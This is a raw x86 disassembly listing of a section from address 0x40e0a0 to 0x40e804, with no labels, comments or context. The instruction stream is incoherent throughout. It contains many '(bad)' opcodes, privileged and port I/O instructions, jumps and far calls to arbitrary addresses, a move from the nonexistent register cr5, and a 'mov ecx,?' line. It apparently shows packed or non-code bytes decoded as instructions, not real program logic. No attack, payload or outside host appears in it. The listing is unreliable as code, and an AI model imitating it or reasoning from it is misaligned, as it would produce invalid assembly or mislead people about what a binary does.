  40e0a0:	or     DWORD PTR [ebx-0x73e8268a],edi
  40e0a6:	psrlw  mm4,QWORD PTR [esi]
  40e0a9:	cwde   
  40e0aa:	outs   dx,DWORD PTR ds:[esi]
  40e0ab:	rcl    DWORD PTR [edx-0x16],0xbf
  40e0af:	call   0xe20f6a1a
  40e0b4:	jno    0x40e11c
  40e0b6:	jb     0x40e0d1
  40e0b8:	sub    eax,0xd3ab4529
  40e0bd:	jno    0x40e101
  40e0bf:	outs   dx,DWORD PTR ds:[esi]
  40e0c0:	jge    0x40e0a1
  40e0c2:	jne    0x40e0e9
  40e0c4:	push   cs
  40e0c5:	sub    ebp,DWORD PTR [edx+eiz*1-0x71]
  40e0c9:	dec    eax
  40e0ca:	fs stos DWORD PTR es:[edi],eax
  40e0cc:	gs pop esp
  40e0ce:	dec    ebp
  40e0cf:	mov    ebx,0xe1d57a2
  40e0d4:	inc    eax
  40e0d5:	cs jo  0x40e103
  40e0d8:	js     0x40e07e
  40e0da:	popa   
  40e0db:	mov    eax,DWORD PTR [ecx-0x6b]
  40e0de:	sub    DWORD PTR [edi],ecx
  40e0e0:	je     0x40e08a
  40e0e2:	jae    0x40e0fb
  40e0e4:	fild   QWORD PTR [edx+0x4c47534f]
  40e0ea:	xor    ah,BYTE PTR [ebp+0x1ccf4dbb]
  40e0f0:	pop    edi
  40e0f1:	or     DWORD PTR [ecx+0x48],0xffffffee
  40e0f5:	mov    al,ds:0xa48b2e1f
  40e0fa:	xchg   edi,eax
  40e0fb:	push   ecx
  40e0fc:	int    0xf6
  40e0fe:	push   edx
  40e0ff:	add    al,0x2c
  40e101:	lods   al,BYTE PTR ds:[esi]
  40e102:	mov    bl,BYTE PTR [edx-0x4a]
  40e105:	jecxz  0x40e0ad
  40e107:	cmp    ah,BYTE PTR [ecx]
  40e109:	in     eax,0x7f
  40e10b:	cmp    al,BYTE PTR [edx-0x7b520449]
  40e111:	repnz rcl BYTE PTR [ecx+edx*2+0x5f6405e0],1
  40e119:	std    
  40e11a:	out    0x5d,eax
  40e11c:	pop    edi
  40e11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e11e:	inc    ebp
  40e11f:	fadd   QWORD PTR [ecx-0x54]
  40e122:	push   esp
  40e123:	pop    ds
  40e124:	jl     0x40e0d6
  40e126:	and    cl,BYTE PTR [ecx+esi*2]
  40e129:	lahf   
  40e12a:	das    
  40e12b:	add    al,BYTE PTR [ebp+ecx*4+0x15ef55f1]
  40e132:	call   0xb10d8ed9
  40e137:	sub    edx,esi
  40e139:	sub    BYTE PTR [eax+0x6],bl
  40e13c:	mov    dh,0xa9
  40e13e:	test   BYTE PTR [ebx+0x43],dl
  40e141:	test   eax,0xf7e3e1c2
  40e146:	call   0x59945af5
  40e14b:	push   esi
  40e14c:	retw   0xf0f0
  40e150:	jmp    0x40e189
  40e152:	fcom   st(0)
  40e154:	ins    DWORD PTR es:[edi],dx
  40e155:	mov    edi,0xd95bb6d2
  40e15a:	dec    esp
  40e15b:	xor    BYTE PTR [edi+edi*8-0x4b01ca24],ch
  40e162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e163:	sub    ebp,DWORD PTR [eax-0x37]
  40e166:	test   DWORD PTR [eax+0xb98d31f],esp
  40e16c:	lods   al,BYTE PTR ds:[esi]
  40e16d:	jmp    0xb050724a
  40e172:	xor    edi,DWORD PTR [ecx+0x23b239d2]
  40e178:	repz lea edi,[ebp+0x36b3619a]
  40e17f:	ror    BYTE PTR [esi],0x8d
  40e182:	push   0x81815bb3
  40e187:	int3   
  40e188:	(bad)  
  40e189:	outs   dx,DWORD PTR ds:[esi]
  40e18a:	out    0x16,al
  40e18c:	and    eax,0x42a010e4
  40e191:	push   es
  40e192:	test   eax,0xb2b17b0c
  40e197:	ret    
  40e198:	stos   BYTE PTR es:[edi],al
  40e199:	cmp    DWORD PTR [eax+0x0],edx
  40e19c:	imul   ebp,DWORD PTR [eax],0x54bd5741
  40e1a2:	and    BYTE PTR [eax-0x123f42df],dl
  40e1a8:	(bad)  
  40e1a9:	dec    ecx
  40e1aa:	js     0x40e1f3
  40e1ac:	cs cld 
  40e1ae:	popf   
  40e1af:	mov    ch,0x5e
  40e1b1:	lds    ebx,FWORD PTR [ebx*2+0x2a51d6d1]
  40e1b8:	ret    0x15f1
  40e1bb:	pop    eax
  40e1bc:	pop    ecx
  40e1bd:	pushf  
  40e1be:	test   BYTE PTR [ecx+eax*4-0x32],al
  40e1c2:	inc    ebx
  40e1c3:	inc    esp
  40e1c4:	jmp    0xcb8d010
  40e1c9:	xchg   BYTE PTR [edi+0x451a91f7],al
  40e1cf:	(bad)  
  40e1d0:	xchg   ebx,eax
  40e1d1:	gs mov eax,0xa0c7fbf1
  40e1d7:	loop   0x40e234
  40e1d9:	popa   
  40e1da:	popf   
  40e1db:	jg     0x40e18a
  40e1dd:	mov    ss,WORD PTR [ecx-0x12]
  40e1e0:	inc    ebp
  40e1e1:	js     0x40e1e3
  40e1e3:	mov    ds:0x528da06a,al
  40e1e8:	add    BYTE PTR [edx+0x62653f06],dl
  40e1ee:	push   eax
  40e1ef:	xchg   esp,ecx
  40e1f1:	loope  0x40e18c
  40e1f3:	pushw  cs
  40e1f5:	clc    
  40e1f6:	mov    dx,0xe440
  40e1fa:	xchg   ecx,eax
  40e1fb:	cmp    ax,0x1b32
  40e1ff:	mov    ch,BYTE PTR [esi-0x132f942b]
  40e205:	shr    edi,cl
  40e207:	mov    edx,0x21533250
  40e20c:	stc    
  40e20d:	xor    al,0xb2
  40e20f:	cmovle esi,DWORD PTR [ebx]
  40e212:	sbb    ah,BYTE PTR [edi+0x1e]
  40e215:	sar    DWORD PTR [edi+0x67],1
  40e218:	inc    eax
  40e219:	adc    eax,0xe104b3b6
  40e21e:	mov    ds,WORD PTR [edi+0x77a6474f]
  40e224:	fsub   DWORD PTR [eax]
  40e226:	cld    
  40e227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e228:	fwait
  40e229:	and    eax,0xeb8c7d89
  40e22e:	sub    cl,BYTE PTR [esi-0x4acae50e]
  40e234:	pusha  
  40e235:	lods   al,BYTE PTR ds:[esi]
  40e236:	fs lahf 
  40e238:	sbb    bl,dl
  40e23a:	inc    ecx
  40e23b:	or     BYTE PTR [ebx+0x5b],dl
  40e23e:	nop
  40e23f:	inc    ecx
  40e240:	fild   QWORD PTR [esi+0xdb5de14]
  40e246:	and    ah,BYTE PTR [edx]
  40e248:	mov    eax,ds:0x5ec8c3e5
  40e24d:	dec    esp
  40e24e:	pop    ebx
  40e24f:	pop    ds
  40e250:	inc    ebp
  40e251:	inc    eax
  40e252:	int3   
  40e253:	sub    eax,0x882fd10a
  40e258:	shl    DWORD PTR [ecx],cl
  40e25a:	mov    cl,0x6f
  40e25c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e25d:	lahf   
  40e25e:	sub    DWORD PTR [edx-0x3d82af19],eax
  40e264:	or     bl,BYTE PTR [eax+0x4fc95071]
  40e26a:	adc    al,BYTE PTR [esi]
  40e26c:	mov    ah,0x23
  40e26e:	fwait
  40e26f:	jmp    0xe4229c93
  40e274:	xor    BYTE PTR [esi],al
  40e276:	pusha  
  40e277:	dec    edx
  40e278:	dec    edi
  40e279:	jmp    0x1eb8caf8
  40e27e:	and    BYTE PTR [edi-0x1fac3d99],ah
  40e284:	or     eax,0x4661cbf8
  40e289:	call   0x521fe0af
  40e28e:	in     al,dx
  40e28f:	cli    
  40e290:	popa   
  40e291:	out    0xcd,al
  40e293:	sub    ebx,DWORD PTR [ebx]
  40e295:	or     BYTE PTR [ecx-0x21],bh
  40e298:	cmp    DWORD PTR [eax],0x3f0fcbb8
  40e29e:	push   ebx
  40e29f:	daa    
  40e2a0:	mov    ch,bh
  40e2a2:	ret    0x972b
  40e2a5:	mov    dl,0x66
  40e2a7:	sub    eax,0x8e59b7f2
  40e2ac:	ret    
  40e2ad:	sbb    DWORD PTR [edx-0x4a],edi
  40e2b0:	push   eax
  40e2b1:	sti    
  40e2b2:	(bad)  [edi]
  40e2b4:	jnp    0x40e276
  40e2b6:	adc    DWORD PTR [ecx-0x44],ebx
  40e2b9:	hlt    
  40e2ba:	jnp    0x40e2cf
  40e2bc:	fisttp DWORD PTR ds:0xbacc8f74
  40e2c2:	pop    ebp
  40e2c3:	hlt    
  40e2c4:	(bad)  
  40e2c5:	jecxz  0x40e25b
  40e2c7:	sub    ah,BYTE PTR [esi]
  40e2c9:	lahf   
  40e2ca:	fld    TBYTE PTR [edx-0x4b]
  40e2cd:	test   DWORD PTR [edx-0x12e7d05b],ebp
  40e2d3:	mov    ds:0xbe27ef40,al
  40e2d8:	out    dx,al
  40e2d9:	xor    ah,BYTE PTR [edx+0x6c]
  40e2dc:	scas   eax,DWORD PTR es:[edi]
  40e2dd:	shl    edx,0xd8
  40e2e0:	sar    ebx,0x4b
  40e2e3:	les    ecx,FWORD PTR [edx+edx*1]
  40e2e6:	push   cs
  40e2e7:	mov    eax,0x81e092d7
  40e2ec:	inc    edi
  40e2ed:	or     DWORD PTR [ebx-0x3e],0x40
  40e2f1:	ins    DWORD PTR es:[edi],dx
  40e2f2:	pop    ebx
  40e2f3:	aad    0x47
  40e2f5:	push   edx
  40e2f6:	not    DWORD PTR [edx-0xabdcd48]
  40e2fc:	popa   
  40e2fd:	push   ebp
  40e2fe:	lods   eax,DWORD PTR ds:[esi]
  40e2ff:	hlt    
  40e300:	xor    al,al
  40e302:	push   0xae916215
  40e307:	or     DWORD PTR [edx+0x6],0xad37ec3b
  40e30e:	pop    es
  40e30f:	outs   dx,BYTE PTR ds:[esi]
  40e310:	sbb    edi,eax
  40e312:	pop    ds
  40e313:	in     al,dx
  40e314:	xchg   BYTE PTR [edi+eiz*1],al
  40e317:	mov    bl,0x7e
  40e319:	xchg   BYTE PTR [ebp-0x6c],dh
  40e31c:	mov    BYTE PTR ss:[edx],dh
  40e31f:	push   eax
  40e320:	inc    ebp
  40e321:	cs cld 
  40e323:	push   edi
  40e324:	jl     0x40e2d8
  40e326:	iret   
  40e327:	mov    bh,0x10
  40e329:	frstor [edi-0x2f9a3b45]
  40e32f:	jmp    0x40e330
  40e331:	fldenv [edx-0x5c6d78b4]
  40e337:	int3   
  40e338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e339:	xlat   BYTE PTR ds:[ebx]
  40e33a:	xor    ch,BYTE PTR [ebx+0x6f83c509]
  40e340:	push   0x1b
  40e342:	jbe    0x40e384
  40e344:	mov    dh,0x4d
  40e346:	cmp    BYTE PTR [edi+0x67],0x81
  40e34a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e34b:	or     DWORD PTR [ecx+0x3174a350],edx
  40e351:	cli    
  40e352:	lods   eax,DWORD PTR ds:[esi]
  40e353:	aad    0x9f
  40e355:	cmp    eax,0xcbbbf9df
  40e35a:	(bad)  
  40e35b:	mov    ebp,0x2ef543b8
  40e360:	aad    0xd3
  40e362:	push   es
  40e363:	sub    DWORD PTR [ecx+0x73],ecx
  40e366:	mov    esi,0xd6309f22
  40e36b:	jns    0x40e379
  40e36d:	add    BYTE PTR [esi-0x330253b6],0xc2
  40e374:	add    al,0xcb
  40e376:	lods   al,BYTE PTR ds:[esi]
  40e377:	mov    esi,DWORD PTR [ecx+edi*8+0x4a]
  40e37b:	inc    edx
  40e37c:	(bad)  
  40e37d:	mov    ecx,0x778c610f
  40e382:	dec    edi
  40e383:	aam    0xf3
  40e385:	call   0x2fff:0x56d0eb8d
  40e38c:	loop   0x40e3b3
  40e38e:	test   esp,ebp
  40e390:	push   cs
  40e391:	(bad)  
  40e392:	aam    0xc1
  40e394:	or     eax,0x6b22987f
  40e399:	les    esi,FWORD PTR [ecx+0xf]
  40e39c:	push   ebp
  40e39d:	loope  0x40e401
  40e39f:	dec    edx
  40e3a0:	push   esp
  40e3a1:	in     eax,dx
  40e3a2:	mov    ch,BYTE PTR [esi-0x5a58e62a]
  40e3a8:	inc    esi
  40e3a9:	add    eax,0xac1e952b
  40e3ae:	nop
  40e3af:	fs xchg edx,eax
  40e3b1:	xor    bh,BYTE PTR [ebx+ecx*2+0xeb36599]
  40e3b8:	ins    BYTE PTR es:[edi],dx
  40e3b9:	mov    ds:0x2ddb3dba,eax
  40e3be:	sub    BYTE PTR [edi],0xc5
  40e3c1:	push   ecx
  40e3c2:	fcomip st,st(4)
  40e3c4:	jns    0x40e386
  40e3c6:	outs   dx,DWORD PTR ds:[esi]
  40e3c7:	inc    eax
  40e3c8:	rol    BYTE PTR ds:0x1a7c7f7a,0xee
  40e3cf:	adc    eax,0x2eda5ee4
  40e3d4:	aas    
  40e3d5:	add    eax,0xc2556e5f
  40e3da:	outs   dx,BYTE PTR ds:[esi]
  40e3db:	xlat   BYTE PTR ds:[ebx]
  40e3dc:	call   0xead9:0xca0bb29c
  40e3e3:	and    ah,0x2
  40e3e6:	or     al,dh
  40e3e8:	pop    ss
  40e3e9:	not    BYTE PTR gs:[edi+0x4d]
  40e3ed:	repnz (bad) 
  40e3ef:	cli    
  40e3f0:	xchg   esp,eax
  40e3f2:	shr    DWORD PTR [edx-0x42],cl
  40e3f5:	nop
  40e3f6:	jns    0x40e457
  40e3f8:	cmp    al,0x7f
  40e3fa:	stc    
  40e3fb:	pop    esi
  40e3fc:	popf   
  40e3fd:	or     edi,DWORD PTR [ebx-0x6b73847b]
  40e403:	dec    ebx
  40e404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e405:	out    dx,al
  40e406:	inc    ecx
  40e407:	or     al,BYTE PTR [edx+0x2cb965cc]
  40e40d:	ds loop 0x40e419
  40e410:	cmp    edi,DWORD PTR [edi]
  40e412:	dec    esp
  40e413:	pop    ebx
  40e414:	(bad)
  40e417:	rcl    BYTE PTR [edi+0x7],cl
  40e41a:	xchg   ecx,eax
  40e41b:	mov    ah,0x19
  40e41d:	imul   ebp,ebp,0x59bfd9ef
  40e423:	dec    ebx
  40e424:	pop    edi
  40e425:	popa   
  40e426:	xor    ebx,DWORD PTR [edx-0x2814e7e4]
  40e42c:	mov    dh,0xfe
  40e42e:	(bad)  
  40e42f:	cmc    
  40e430:	retf   0x76ac
  40e433:	xor    eax,0x7d3e22da
  40e438:	aam    0xdb
  40e43a:	adc    DWORD PTR [edi+eax*2],0x254c160a
  40e441:	cmp    DWORD PTR [edi+ebp*1],edx
  40e444:	inc    ecx
  40e445:	cmp    DWORD PTR [edx+0x4c2ab7a3],esp
  40e44b:	jns    0x40e48b
  40e44d:	pop    ebp
  40e44e:	and    eax,0x181a2fdb
  40e453:	jg     0x40e47d
  40e455:	xlat   BYTE PTR ds:[ebx]
  40e456:	leave  
  40e457:	add    al,0xd1
  40e459:	rcl    DWORD PTR [ecx-0x13ab8ce5],cl
  40e45f:	push   0x2220acaa
  40e464:	xchg   edi,eax
  40e465:	and    bl,BYTE PTR [ecx-0x34]
  40e468:	jns    0x40e464
  40e46a:	std    
  40e46b:	lods   eax,DWORD PTR ds:[esi]
  40e46c:	xchg   esp,eax
  40e46d:	pop    ecx
  40e46e:	(bad)  
  40e46f:	fucom  st(7)
  40e471:	sbb    al,0x6d
  40e473:	push   edi
  40e474:	out    0x32,eax
  40e476:	sub    DWORD PTR [ebx+0x31c26051],eax
  40e47c:	call   0x9941:0x2e3bd8ee
  40e483:	mov    fs,WORD PTR [edx-0x236b2c86]
  40e489:	jb     0x40e4f9
  40e48b:	push   ss
  40e48c:	xchg   esi,eax
  40e48d:	ds ret 0x6621
  40e491:	mov    bl,0xe7
  40e493:	in     al,0xa4
  40e495:	icebp  
  40e496:	jb     0x40e467
  40e498:	pop    esi
  40e499:	outs   dx,BYTE PTR ds:[esi]
  40e49a:	leave  
  40e49b:	dec    esi
  40e49c:	mov    bl,0xb5
  40e49e:	xchg   ebp,eax
  40e49f:	outs   dx,BYTE PTR ds:[esi]
  40e4a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4a1:	pop    DWORD PTR [edx+0x4f679f89]
  40e4a7:	xchg   ebp,eax
  40e4a8:	xor    eax,0x5729e4e3
  40e4ad:	lods   al,BYTE PTR ds:[esi]
  40e4ae:	popf   
  40e4af:	ret    
  40e4b0:	mov    ds:0x80a69320,eax
  40e4b5:	ins    BYTE PTR es:[edi],dx
  40e4b6:	ins    BYTE PTR es:[edi],dx
  40e4b7:	sbb    al,0xb4
  40e4b9:	or     BYTE PTR [ecx-0x7e865ccd],dl
  40e4bf:	mov    eax,ds:0x1f329844
  40e4c4:	enter  0xb16f,0xa
  40e4c8:	jae    0x40e489
  40e4ca:	fisubr WORD PTR [esi-0x7ffbfedf]
  40e4d0:	cmp    dl,BYTE PTR [eax+0x2d]
  40e4d3:	xchg   ecx,eax
  40e4d4:	xchg   eax,eax
  40e4d6:	cdq    
  40e4d7:	cdq    
  40e4d8:	ss inc esi
  40e4da:	sub    ch,BYTE PTR [ecx+ecx*4-0x3c]
  40e4de:	jecxz  0x40e490
  40e4e0:	xor    eax,ebp
  40e4e2:	jne    0x40e472
  40e4e4:	mov    ah,0x37
  40e4e6:	mov    ebx,0x1eea4277
  40e4eb:	in     eax,0x26
  40e4ed:	je     0x40e4df
  40e4ef:	dec    edi
  40e4f0:	push   ss
  40e4f1:	retf   
  40e4f2:	xor    DWORD PTR [edi-0x17],esi
  40e4f5:	mov    es,WORD PTR [edi-0x1e]
  40e4f8:	lods   al,BYTE PTR ds:[esi]
  40e4f9:	adc    DWORD PTR ds:0xd49203d8,ecx
  40e4ff:	cmp    DWORD PTR fs:[edi+0x7adf78a8],esp
  40e506:	rcr    DWORD PTR ss:[edi],1
  40e509:	lods   al,BYTE PTR ds:[esi]
  40e50a:	cmp    dh,BYTE PTR [eax-0x3bd39a58]
  40e510:	loope  0x40e554
  40e512:	xor    BYTE PTR [edi],0xb6
  40e515:	xor    al,0xd6
  40e517:	retf   
  40e518:	mov    ecx,?
  40e51a:	in     eax,0xdc
  40e51c:	mov    al,ds:0xb07dc14e
  40e521:	cdq    
  40e522:	rcl    DWORD PTR [edi+0x45b82332],0xec
  40e529:	push   0x83efc363
  40e52e:	cdq    
  40e52f:	outs   dx,DWORD PTR ds:[esi]
  40e530:	in     eax,0xb4
  40e532:	test   al,0xbf
  40e534:	xor    edx,eax
  40e536:	test   dh,bh
  40e538:	stos   BYTE PTR es:[edi],al
  40e539:	sub    al,0x16
  40e53b:	ja     0x40e527
  40e53d:	dec    eax
  40e53e:	xchg   esi,eax
  40e53f:	mov    bl,0x3c
  40e541:	xchg   ebx,eax
  40e542:	push   cs
  40e543:	repz arpl bp,dx
  40e546:	jo     0x40e55c
  40e548:	pop    esi
  40e549:	pop    esi
  40e54a:	adc    al,0xb5
  40e54c:	ret    
  40e54d:	(bad)  
  40e54f:	xor    eax,0x8743559b
  40e554:	(bad)  
  40e555:	cmp    eax,0xb9bec5f3
  40e55a:	xor    bh,cl
  40e55c:	in     al,dx
  40e55d:	icebp  
  40e55e:	push   edx
  40e55f:	push   ecx
  40e560:	push   ebx
  40e561:	(bad)  
  40e562:	jno    0x40e5d3
  40e564:	je     0x40e570
  40e566:	xlat   BYTE PTR ds:[ebx]
  40e567:	push   di
  40e569:	cmp    edx,eax
  40e56b:	mov    eax,0xeb5c98bd
  40e570:	and    BYTE PTR [edi-0x24dd38ea],ch
  40e576:	or     eax,0x37a72d17
  40e57b:	dec    eax
  40e57c:	sbb    eax,0x68d5f98
  40e581:	retf   
  40e582:	data16 loop 0x40e57d
  40e585:	adc    al,0x27
  40e587:	mov    bl,0x1e
  40e589:	and    BYTE PTR [ebp+0x17],ch
  40e58c:	lahf   
  40e58d:	test   DWORD PTR [ecx+0x33],eax
  40e590:	scas   eax,DWORD PTR es:[edi]
  40e591:	sub    ecx,edx
  40e593:	les    edi,FWORD PTR [ecx]
  40e595:	push   0x54038220
  40e59a:	mov    cl,0x6d
  40e59c:	leave  
  40e59d:	aad    0x8a
  40e59f:	pop    edx
  40e5a0:	xor    ebp,esi
  40e5a2:	dec    eax
  40e5a3:	rcr    BYTE PTR [esp+ebx*2-0x3e59096],cl
  40e5aa:	fldenv [ecx]
  40e5ac:	scas   al,BYTE PTR es:[edi]
  40e5ad:	inc    esi
  40e5ae:	dec    ecx
  40e5af:	fdiv   DWORD PTR [edi+0x7d2fb84b]
  40e5b5:	mov    DWORD PTR [ebx-0x5147a866],esp
  40e5bb:	inc    eax
  40e5bc:	add    eax,0xdb8e621b
  40e5c1:	repnz push ecx
  40e5c3:	add    ebx,ecx
  40e5c5:	lods   eax,DWORD PTR ds:[esi]
  40e5c6:	retf   
  40e5c7:	mov    al,ds:0x32e9e2ba
  40e5cc:	dec    eax
  40e5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ce:	mov    ecx,0x68019bfa
  40e5d3:	sbb    al,0x63
  40e5d5:	shr    BYTE PTR [eax+0x58bb410f],1
  40e5db:	or     ecx,DWORD PTR [edi+eax*4+0x25]
  40e5df:	das    
  40e5e0:	and    eax,0xe24263bd
  40e5e5:	push   cs
  40e5e6:	mov    cl,BYTE PTR [ecx]
  40e5e8:	push   cs
  40e5e9:	fwait
  40e5ea:	xor    bl,BYTE PTR [edx-0x66]
  40e5ed:	repz xor al,0xef
  40e5f0:	mov    BYTE PTR [ebp+0x1c5f84bc],dh
  40e5f6:	add    al,0xab
  40e5f8:	xchg   esp,eax
  40e5f9:	mov    ecx,0x862b3eb3
  40e5fe:	bound  edi,QWORD PTR [ebx]
  40e600:	dec    esi
  40e601:	xchg   esi,eax
  40e602:	sahf   
  40e603:	ret    0x8e21
  40e606:	mov    ah,0xee
  40e608:	aas    
  40e609:	mov    esi,0x33e51b85
  40e60e:	or     al,0xe2
  40e610:	lahf   
  40e611:	test   eax,eax
  40e613:	inc    ebp
  40e614:	aas    
  40e615:	adc    dh,BYTE PTR [edi+0x318906a8]
  40e61b:	clc    
  40e61c:	sbb    al,0xb4
  40e61e:	xor    ah,BYTE PTR [esi-0x26]
  40e621:	sub    ebx,DWORD PTR [ebx]
  40e623:	mov    bl,0xa0
  40e625:	sbb    edx,DWORD PTR [edi-0x34]
  40e628:	jle    0x40e5f2
  40e62a:	neg    DWORD PTR [eax-0x76832716]
  40e630:	add    eax,0x4ca5d0ba
  40e635:	inc    ebx
  40e636:	int    0x9e
  40e638:	xor    BYTE PTR [edx-0x53],dl
  40e63b:	out    0x9a,al
  40e63d:	pop    edi
  40e63e:	fcmovnb st,st(1)
  40e640:	or     DWORD PTR [edx-0x15fa4a09],esp
  40e646:	cwde   
  40e647:	and    edi,eax
  40e649:	and    BYTE PTR [ebp-0x727b739c],bl
  40e64f:	inc    eax
  40e650:	xchg   edi,eax
  40e651:	adc    BYTE PTR [eax+0x4d],al
  40e654:	in     eax,0xb3
  40e656:	adc    eax,0x96599d59
  40e65b:	mov    al,ds:0xa386d74
  40e660:	xchg   esi,eax
  40e661:	push   cs
  40e662:	xor    BYTE PTR [eax+edx*2+0x23e261fc],cl
  40e669:	add    al,0x5b
  40e66b:	and    esi,DWORD PTR [eax]
  40e66d:	lds    edx,FWORD PTR [ecx-0x5e]
  40e670:	shl    dl,cl
  40e672:	pop    edi
  40e673:	dec    eax
  40e674:	xor    DWORD PTR [eax+0x79],0x6c
  40e678:	adc    al,0x32
  40e67a:	jl     0x40e6c8
  40e67c:	pop    ds
  40e67d:	inc    edx
  40e67e:	sar    ecx,0x99
  40e681:	repnz out dx,eax
  40e683:	(bad)  
  40e684:	hlt    
  40e685:	rol    DWORD PTR [ebp-0x6],1
  40e688:	mov    ds:0xaf1ebfe2,eax
  40e68d:	pop    ds
  40e68e:	mov    esi,0x8c48ab4d
  40e693:	xchg   esp,eax
  40e694:	pop    edx
  40e695:	ror    DWORD PTR [ebp+0x41a52420],cl
  40e69b:	adc    esi,DWORD PTR [edi-0x6e93899f]
  40e6a1:	sub    bl,BYTE PTR [ecx]
  40e6a3:	xor    DWORD PTR [edi-0x40],edx
  40e6a6:	ins    BYTE PTR es:[edi],dx
  40e6a7:	sub    BYTE PTR [edx+0x53],ah
  40e6aa:	or     ah,BYTE PTR [eax-0x3c]
  40e6ad:	or     al,0x2d
  40e6af:	and    eax,0x572533a5
  40e6b4:	mov    BYTE PTR ds:0x5abeab4,ah
  40e6ba:	inc    BYTE PTR [ecx]
  40e6bc:	addr16 pop esi
  40e6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6bf:	addr16 dec ebp
  40e6c1:	stos   BYTE PTR es:[edi],al
  40e6c2:	mov    al,ds:0xf9a382ee
  40e6c7:	lds    eax,FWORD PTR [esp+edi*2-0x5701c527]
  40e6ce:	jae    0x40e690
  40e6d0:	push   ss
  40e6d1:	add    DWORD PTR [eax-0x29],edi
  40e6d4:	push   edi
  40e6d5:	push   ebp
  40e6d6:	mov    al,ds:0xebb84391
  40e6db:	lea    esp,[ecx]
  40e6dd:	push   cs
  40e6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6df:	jecxz  0x40e6ed
  40e6e1:	push   eax
  40e6e2:	mov    dh,0x40
  40e6e4:	in     eax,dx
  40e6e5:	int3   
  40e6e6:	mov    ecx,ds
  40e6e8:	pop    edi
  40e6e9:	jno    0x40e707
  40e6eb:	pop    ds
  40e6ec:	outs   dx,DWORD PTR ds:[esi]
  40e6ed:	popa   
  40e6ee:	mov    al,0xd3
  40e6f0:	mov    ds:0xf93acbb0,al
  40e6f5:	cmp    esp,ecx
  40e6f7:	jl     0x40e768
  40e6f9:	out    dx,eax
  40e6fa:	cmp    BYTE PTR [ebx],0xfe
  40e6fd:	jmp    0x4edfe4cf
  40e702:	inc    ebx
  40e703:	gs (bad) 
  40e705:	adc    BYTE PTR [esi-0x46ff91c7],al
  40e70b:	push   0xd6cb4e7f
  40e710:	sub    al,0x41
  40e712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e713:	lock les ebx,FWORD PTR [edx]
  40e716:	fld    QWORD PTR [edi-0x54]
  40e719:	mov    al,0x14
  40e71b:	rcr    DWORD PTR [edi+0xd],cl
  40e71e:	mov    cl,0xb4
  40e720:	adc    dl,BYTE PTR ds:0xeb734a88
  40e726:	scas   al,BYTE PTR es:[edi]
  40e727:	sub    ecx,esi
  40e729:	sahf   
  40e72a:	ret    
  40e72b:	mov    ah,0xbc
  40e72d:	into   
  40e72e:	mov    bl,0xe0
  40e730:	or     BYTE PTR [eax-0xbc29f8],ch
  40e736:	sbb    al,0x4e
  40e738:	pop    edx
  40e739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e73a:	sbb    eax,0x6e22d1ff
  40e73f:	loop   0x40e761
  40e741:	lock mov esi,0xde0b3e5e
  40e747:	and    dl,BYTE PTR [ebp-0x2a64949e]
  40e74d:	clc    
  40e74e:	sbb    edi,DWORD PTR [ecx]
  40e750:	xor    eax,0x47da685c
  40e755:	mov    DWORD PTR ds:0xb48695e4,ebp
  40e75b:	mov    ecx,0x92be7399
  40e760:	cmc    
  40e761:	mov    edx,0x3c52b30c
  40e766:	mov    ebp,edx
  40e768:	stos   BYTE PTR es:[edi],al
  40e769:	jae    0x40e73c
  40e76b:	xchg   BYTE PTR [ebx-0x2c],ah
  40e76e:	ss push ss
  40e770:	or     DWORD PTR [edx],edx
  40e772:	lods   al,BYTE PTR ds:[esi]
  40e773:	and    eax,0xb094c54b
  40e778:	inc    esi
  40e779:	addr16 pushw 0x45
  40e77d:	mov    dh,0xca
  40e77f:	test   eax,0x8950190b
  40e784:	mov    edx,0x238f190d
  40e789:	dec    ebx
  40e78a:	xor    al,0xa
  40e78c:	shl    BYTE PTR [ebx-0x101659c],1
  40e792:	cmp    BYTE PTR [ebp+0x13],bl
  40e795:	shr    BYTE PTR [edx],1
  40e797:	icebp  
  40e798:	cmp    eax,0x3460477e
  40e79d:	or     eax,0xe2fd0bcf
  40e7a2:	cmp    bl,BYTE PTR [edx+edx*1-0x4b]
  40e7a6:	mov    ds:0xc6b579b3,al
  40e7ab:	icebp  
  40e7ac:	mov    eax,0xed1d03ba
  40e7b1:	jno    0x40e7fd
  40e7b3:	retf   
  40e7b4:	pop    edx
  40e7b5:	pop    ebp
  40e7b6:	dec    BYTE PTR [edi-0x16]
  40e7b9:	mov    esi,0xf63757c9
  40e7be:	(bad)  
  40e7bf:	xchg   ebp,eax
  40e7c0:	inc    ebx
  40e7c1:	repz sub DWORD PTR [edx-0x24d57abc],ecx
  40e7c8:	das    
  40e7c9:	inc    esp
  40e7ca:	mov    dh,0x89
  40e7cc:	jae    0x40e7ff
  40e7ce:	int    0x10
  40e7d0:	xchg   edx,eax
  40e7d1:	add    DWORD PTR [esi+0x14],ebp
  40e7d4:	fs pop ss
  40e7d6:	mov    esp,DWORD PTR [ebp+0x20]
  40e7d9:	pop    ss
  40e7da:	add    al,BYTE PTR [ebx]
  40e7dc:	xchg   ebp,eax
  40e7dd:	push   edi
  40e7de:	retf   
  40e7df:	add    al,0x1b
  40e7e1:	inc    edi
  40e7e2:	bsr    eax,DWORD PTR [ecx+0x79]
  40e7e6:	mov    esp,cr5
  40e7e9:	out    dx,al
  40e7ea:	sbb    BYTE PTR [eax-0x3175578f],cl
  40e7f0:	out    0x6d,eax
  40e7f2:	outs   dx,DWORD PTR ds:[esi]
  40e7f3:	hlt    
  40e7f4:	das    
  40e7f5:	jnp    0x40e791
  40e7f7:	inc    ebp
  40e7f8:	cmp    BYTE PTR [si+0x15],ch
  40e7fc:	das    
  40e7fd:	sar    al,1
  40e7ff:	call   DWORD PTR [eax-0x31]
  40e802:	ds pusha 
  40e804:	mov    ds:0x6b42b97e,al
